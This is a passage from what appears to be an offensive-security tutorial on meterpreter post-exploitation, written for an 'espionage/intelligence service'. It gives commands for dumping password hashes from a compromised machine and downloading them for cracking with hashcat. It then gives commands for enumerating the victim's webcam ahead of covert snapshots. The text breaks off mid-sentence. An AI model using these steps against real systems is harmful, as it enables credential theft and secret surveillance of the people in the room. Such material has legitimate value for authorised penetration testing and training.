![](bbox=[0.13, 0.1, 0.87, 0.47])

Now that we have these hashes, we can download them and crack them in one of the many password crackers in Kali, such as hashcat. To capture these hashes to a file, simply enter; meterpreter > hashdump > hashes Then, use the built-in download command in our meterpreter.

```
meterpreter > download hashes
```

In addition, our espionage/intelligence service may want to see what is happening in the room where the computer is located. The meterpreter has a command that will turn on the webcam and take a single snapshot. It’s named webcam_snap. Before we use it, we need to check to see whether a webcam exists on the system and what number has been assigned to it by the operating system. We can use the webcam_list command to do that.

```
meterpreter> webcam_list
```

As you can see in the screenshot above, the target system has one webcam, and it has been